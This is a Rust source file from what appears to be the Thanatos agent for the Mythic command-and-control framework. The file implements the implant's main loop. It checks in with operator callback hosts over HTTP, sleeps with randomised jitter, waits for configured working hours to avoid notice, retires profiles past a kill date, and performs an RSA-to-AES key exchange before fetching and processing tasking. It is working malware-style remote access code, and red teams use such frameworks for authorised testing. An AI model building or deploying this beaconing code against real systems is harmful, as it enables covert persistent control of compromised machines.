use std::{cmp::Ordering, time::Duration};

use crate::tasker::Tasker;

use super::{CoreAgent, EgressAgent};
use agent_utils::{
    errors::{ProfileInternalError, ThanatosError},
    log,
    msg::{
        ExtraInfo, GetTaskingMsg, GetTaskingResponse, InitialCheckinInfo, InitialCheckinResponse,
        MythicAction, MythicStatus, SpawnToValue,
    },
};
use rand::{rngs::SmallRng, seq::IteratorRandom, Rng, SeedableRng};

use agent_utils::debug_invoke;
use egress_profile::{C2ProfileDefinition, EgressProfileHandle};

/// Main agent struct for egress type agents.
pub struct Agent {
    /// UUID of the agent
    pub uuid: String,

    /// Data shared between the agent and tasker
    shared: AgentShared,

    /// Number of times to attempt to reconnect if there is a failed connection
    connection_tries: u32,

    /// Random number generator for calculating the sleep jitter choosing the C2 profile
    rng: SmallRng,

    /// Processes tasks
    tasker: Tasker,
}

/// Holds all information used by the C2 profiles and can be modified by commands.
pub struct AgentShared {
    /// Callback interval of the agent (in milliseconds)
    pub callback_interval: Duration,

    /// Callback jitter of the agent
    pub callback_jitter: u32,

    /// Start of the working hours (duration since midnight)
    pub working_start: Duration,

    /// End of the working hours (duration since midnight)
    pub working_end: Duration,

    /// Configured C2 Profiles
    pub c2profiles: Vec<C2ProfileDefinition>,

    /// Flag indicating the agent should exit
    pub exit_agent: bool,
}

impl CoreAgent for Agent {
    fn run(&mut self) -> Result<(), ThanatosError> {
        debug_invoke!(self.make_checkin());

        log!("Made checkin");

        let mut tasking_msg = GetTaskingMsg::default();

        while !self.shared.exit_agent {
            self.sleep();
            let tasking_info = debug_invoke!(self.get_tasking(tasking_msg));
            tasking_msg = self.tasker.process_messages(tasking_info, &mut self.shared);
        }

        Ok(())
    }

    fn initialize_from_tasker(tasker: Tasker) -> Result<Self, ThanatosError> {
        let mut c2profiles = Vec::new();
        let mut profile_id = 0;

        #[cfg(any(feature = "http", feature = "https"))]
        {
            use egress_profile::http::HttpProfile;
            let callback_hosts = config::http::get_callback_hosts();

            callback_hosts.iter().for_each(|host| {
                if let Ok(profile) = HttpProfile::new(host) {
                    let name =
                        format!("{}:{}", host.to_string(), config::http::get_callback_port());

                    c2profiles.push(C2ProfileDefinition {
                        id: profile_id,
                        name,
                        enabled: true,
                        defunct: false,
                        killdate: Duration::from_secs(config::http::get_killdate()),
                        handle: EgressProfileHandle::HttpProfile(profile),

                        #[cfg(any(feature = "AES", feature = "EKE"))]
                        enc_key: config::http::get_aeskey(),
                    });
                    profile_id += 1;
                }
            });
        }

        let current_time = agent_utils::get_timestamp();
        c2profiles.retain(|profile| current_time < profile.killdate);

        if c2profiles.len() == 0 {
            return Err(ThanatosError::NoProfiles);
        }

        Ok(Self {
            shared: AgentShared {
                callback_interval: Duration::from_secs(config::get_callback_interval()),
                callback_jitter: config::get_callback_jitter(),
                exit_agent: false,
                working_start: Duration::from_secs(config::get_working_start()),
                working_end: Duration::from_secs(config::get_working_end()),
                c2profiles,
            },

            uuid: config::get_uuid().to_string(),

            rng: SmallRng::from_entropy(),
            connection_tries: config::get_connection_retries(),

            tasker,
        })
    }
}

impl EgressAgent for Agent {
    fn sleep(&mut self) {
        let interval = self.shared.callback_interval;
        if interval.cmp(&Duration::from_secs(0)) == Ordering::Equal {
            return;
        }

        let jitter = self.shared.callback_jitter;
        let jitter = (self.rng.gen_range(0..jitter + 1) as f64) / 100.0;

        let interval = if (self.rng.gen::<u8>() % 2) == 1 {
            interval + interval.mul_f64(jitter)
        } else {
            interval - interval.mul_f64(jitter)
        };

        std::thread::sleep(interval);

        let current_time = agent_utils::get_timeofday();
        if current_time < self.shared.working_start {
            log!(
                "Not at working hours start after sleep. Sleeping for additional {} seconds",
                (self.shared.working_start - current_time).as_secs()
            );
            std::thread::sleep(self.shared.working_start - current_time);
        }

        let current_time = agent_utils::get_timeofday();
        if current_time > self.shared.working_end {
            const MIDNIGHT: Duration = Duration::from_secs(86400);

            log!(
                "Past end of working hours after sleep. Sleeping for additional {} seconds",
                ((MIDNIGHT - current_time) + self.shared.working_start).as_secs()
            );
            std::thread::sleep((MIDNIGHT - current_time) + self.shared.working_start);
        }

        let current_time = agent_utils::get_timestamp();

        self.shared
            .c2profiles
            .retain(|profile| current_time < profile.killdate);

        if self.shared.c2profiles.len() == 0 {
            self.shared.exit_agent = true;
        }
    }
}

impl Agent {
    /// Performs the initial checkin for the egress agent
    pub fn make_checkin(&mut self) -> Result<(), ThanatosError> {
        let current_time = agent_utils::get_timeofday();

        if current_time < self.shared.working_start {
            log!(
                "Not at working hours start for checkin. Sleeping for {} seconds",
                (self.shared.working_start - current_time).as_secs()
            );
            std::thread::sleep(self.shared.working_start - current_time)
        }

        if current_time > self.shared.working_end {
            const MIDNIGHT: Duration = Duration::from_secs(86400);

            log!(
                "Past working hours for initial checkin. Sleeping for {} seconds",
                ((MIDNIGHT - current_time) + self.shared.working_start).as_secs()
            );
            std::thread::sleep((MIDNIGHT - current_time) + self.shared.working_start);
        }

        #[cfg(feature = "EKE")]
        debug_invoke!(self.perform_key_exchange());

        let working_start_hours = self.shared.working_start.as_secs() / 3600;
        let working_start_minutes = (self.shared.working_start.as_secs() / 60) % 60;

        let working_end_hours = (self.shared.working_end.as_secs() - 60) / 3600;
        let working_end_minutes = ((self.shared.working_end.as_secs() - 60) / 60) % 60;

        let c2_profiles = self
            .shared
            .c2profiles
            .iter()
            .map(|profile| profile.borrow_into())
            .collect();

        let spawnto = config::get_spawnto().and_then(|s| {
            let mut s_val = s.split(" ");
            let path = s_val.next()?.to_string();
            let args: Vec<String> = s_val.map(|s| s.to_string()).collect();

            Some(SpawnToValue { path, args })
        });

        let extra_info = serde_json::to_string_pretty(&ExtraInfo {
            working_hours: format!(
                "{:0>2}:{:0>2}-{:0>2}:{:0>2}",
                working_start_hours, working_start_minutes, working_end_hours, working_end_minutes
            )
            .as_str(),
            c2_profiles,
            exec_internal: true,
            spawnto,
        })
        .map_err(|_| ThanatosError::JsonEncodeError)?;

        let jitter = self.shared.callback_jitter;
        let interval = self.shared.callback_interval.as_secs();

        let sleep_info = if jitter == 0 {
            format!("Agent will checkin every {} seconds", interval)
        } else {
            let jitter = jitter as f64 / 100.0;
            let start_range = interval - ((interval as f64 * jitter) as u64);
            let end_range = interval + ((interval as f64 * jitter) as u64);

            format!(
                "Agent will checkin between {} and {} seconds",
                start_range, end_range
            )
        };

        let initial_checkin_info = InitialCheckinInfo {
            action: MythicAction::Checkin,
            uuid: config::get_uuid(),
            attributes: agent_utils::get_checkin_info(),
            extra_info: &extra_info,
            sleep_info: Some(&sleep_info),
        };

        log!("Sending checkin: {:#?}", initial_checkin_info);

        let mut res: InitialCheckinResponse = Default::default();
        for i in 0..self.connection_tries {
            let enabled_profiles = self.shared.c2profiles.iter_mut().filter(|p| p.enabled);
            let profile = enabled_profiles
                .choose(&mut self.rng)
                .ok_or(ThanatosError::NoProfiles)?;

            match profile.send_data(&self.uuid, &initial_checkin_info) {
                Ok(d) => {
                    res = d;
                    break;
                }
                Err(ThanatosError::ProfileError(ProfileInternalError::NoConnection)) => {
                    log!("No connection");
                    if i == self.connection_tries - 1 {
                        return Err(ThanatosError::ProfileError(
                            ProfileInternalError::NoConnection,
                        ));
                    }

                    profile.defunct = true;
                    profile.enabled = false;
                    self.sleep();
                }
                Err(_) => return Err(ThanatosError::MythicStatusError),
            }
        }

        match res.status {
            MythicStatus::Success => {
                self.uuid = res.id;
                Ok(())
            }
            _ => Err(ThanatosError::MythicStatusError),
        }
    }

    /// Gets new tasking from Mythic and posts completed tasks
    pub fn get_tasking(
        &mut self,
        tasking_msg: GetTaskingMsg,
    ) -> Result<GetTaskingResponse, ThanatosError> {
        log!("SENDING: {:#?}", &tasking_msg);

        let mut response: GetTaskingResponse = Default::default();

        for i in 0..self.connection_tries {
            let enabled_profiles = self.shared.c2profiles.iter_mut().filter(|p| p.enabled);
            let profile = enabled_profiles
                .choose(&mut self.rng)
                .ok_or(ThanatosError::NoProfiles)?;

            match profile.send_data(&self.uuid, &tasking_msg) {
                Ok(data) => {
                    profile.defunct = false;
                    response = data;
                    break;
                }
                Err(ThanatosError::ProfileError(ProfileInternalError::NoConnection)) => {
                    log!("Failed to make connection");
                    if i == self.connection_tries - 1 {
                        return Err(ThanatosError::ProfileError(
                            ProfileInternalError::NoConnection,
                        ));
                    }

                    profile.defunct = true;
                    self.sleep()
                }
                Err(e) => return Err(e),
            }
        }

        log!("RECEIVED: {:#?}", &response);

        // Sort the tasks in order by timestamp. Smallest timestamp should be in the back.
        response.tasks.sort_by(|first, second| {
            second
                .timestamp
                .partial_cmp(&first.timestamp)
                .unwrap_or(Ordering::Equal)
        });

        Ok(response)
    }

    #[cfg(feature = "EKE")]
    fn perform_key_exchange(&mut self) -> Result<(), ThanatosError> {
        use agent_utils::{
            crypto::{self, b64decode, b64encode, RsaImpl},
            msg::{StagingEKEMessage, StagingEKEResponse},
        };
        use rand::{distributions::Alphanumeric, rngs::OsRng};

        log!("Performing EKE");

        let rsa_key = crypto::RsaKeyPair::generate(4096)?;

        let session_id: Vec<u8> = self
            .rng
            .clone()
            .sample_iter(&Alphanumeric)
            .take(20)
            .collect();
        let session_id =
            std::str::from_utf8(&session_id).map_err(|_| ThanatosError::StringParseError)?;

        log!("Public key: {}", rsa_key.public_key_pem().unwrap());

        let eke_msg = StagingEKEMessage {
            action: MythicAction::StagingRsa,
            pub_key: b64encode(debug_invoke!(
                rsa_key.public_key_pem(),
                ThanatosError::RsaKeyGenerateError
            )),
            session_id,
        };

        let mut res: StagingEKEResponse = Default::default();
        for i in 0..self.connection_tries {
            let enabled_profiles = self.shared.c2profiles.iter_mut().filter(|p| p.enabled);
            let profile = enabled_profiles
                .choose(&mut self.rng)
                .ok_or(ThanatosError::NoProfiles)?;

            match profile.send_data(&self.uuid, &eke_msg) {
                Ok(response) => {
                    res = response;
                    break;
                }
                Err(ThanatosError::ProfileError(ProfileInternalError::NoConnection)) => {
                    log!("Failed to make connection");
                    if i == self.connection_tries - 1 {
                        return Err(ThanatosError::ProfileError(
                            ProfileInternalError::NoConnection,
                        ));
                    }

                    self.sleep()
                }
                Err(e) => return Err(e),
            }
        }

        let mut session_key = rsa_key.decrypt(b64decode(res.session_key)?.as_ref())?;

        if session_key.len() < 32 {
            return Err(ThanatosError::AesKeyTruncateError);
        }

        session_key.resize(32, 0);
        let aes_key =
            <[u8; 32]>::try_from(session_key).map_err(|_| ThanatosError::AesKeyTruncateError)?;

        #[cfg(any(feature = "AES", feature = "EKE"))]
        self.shared
            .c2profiles
            .iter_mut()
            .for_each(|profile| profile.enc_key = aes_key.clone());

        log!("New AES key: {:?}", &aes_key);

        self.uuid = res.uuid;
        log!("New UUID: {}", &self.uuid);

        self.sleep();

        Ok(())
    }
}
